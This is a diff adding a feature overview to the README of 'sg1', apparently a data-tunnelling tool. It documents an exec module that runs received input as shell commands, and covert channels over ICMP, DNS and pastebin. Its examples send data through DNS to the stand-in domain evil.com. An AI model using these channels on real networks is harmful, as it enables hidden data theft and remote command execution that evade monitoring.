@@ -78,6 +78,102 @@ After compilation, you will find the `sg1` binary inside the `build` folder, you
 4) Implement a new channel ( see `channels/*.go` ).
 5) Write tests, because I'm a lazy s--t.
 
+## Features
+
+The main `sg1` operation logic is:
+
+    while input.has_data() {
+        data = input.read()
+        results = module.process(data)
+        output.write(data)
+    }
+
+Keep in mind that modules and channels can be piped one to another.
+
+### Modules
+
+**raw** 
+
+The default mode, will read from input and write to output.
+
+**base64**
+
+Will read from input, encode in base64 and write to output.
+
+**aes** 
+
+Will read from input, encrypt or decrypt (depending on `--aes-mode` parameter) with `--aes-key` and write to output.
+
+**exec**
+
+Will read from input, execute as a shell command and pipe to output.
+
+### Channels
+
+**console**
+
+The default channel, stdin or stdout depending on the direction.
+
+**tcp** 
+
+A tcp server (if used as input) or client (as output).
+
+Examples:
+
+    -in tcp:0.0.0.0:10000
+    -out tcp:192.168.1.2:10000
+
+**tls**
+
+A tls tcp server (if used as input) or client (as output), it will automatically generate the key pair or load them via `--tls-pem` and `--tls-key` optional parameters.
+
+Examples:
+
+    -in tls:0.0.0.0:10003
+    -out tls:192.168.1.2:10003
+
+**icmp** 
+
+If used as output, data will be chunked and sent as ICMP echo packets, as input an ICMP listener will be started decoding those packets.
+
+Examples:
+
+    -in icmp:0.0.0.0
+    -out icmp:192.168.1.2
+
+**dns** 
+
+If used as output, data will be chunked and sent as DNS requests, as input a DNS server will be started decoding those requests. The accepted syntaxes are:
+
+    dns:domain.tld@resolver:port
+
+In which case, DNS requests will be performed (or decoded) for subdomains of `domain.tld`, sent to the `resolver` ip address on `port`.
+
+    dns:domain.tld
+
+DNS requests will be performed (or decoded) for subdomains of `domain.tld` using default system resolver.
+
+    dns
+
+DNS requests will be performed (or decode) for subdomains of `google.com` using default system resolver.
+
+Examples:
+
+    -in dns:evil.com@0.0.0.0:10053
+    -out dns:evil.com@192.168.1.2:10053
+    -out dns:evil.com
+
+**pastebin**
+
+If used as output, data will be chunked and sent to pastebin.com as private pastes, as input a pastebin listener will be started decoding those pastes.
+
+Examples:
+
+    -in pastebin:YOUR-API-KEY/YOUR-USER-KEY
+    -out pastebin:YOUR-API-KEY/YOUR-USER-KEY
+
+[This](https://pastebin.com/api#8 ) is how you can retrieve your user key given your api key.
+
 ## Examples
 
 In the following examples you will always see 127.0.0.1, but that can be any ip, the tool is tunnelling data locally as a PoC but it also works among different computers on any network (as shown by one of the pictures).
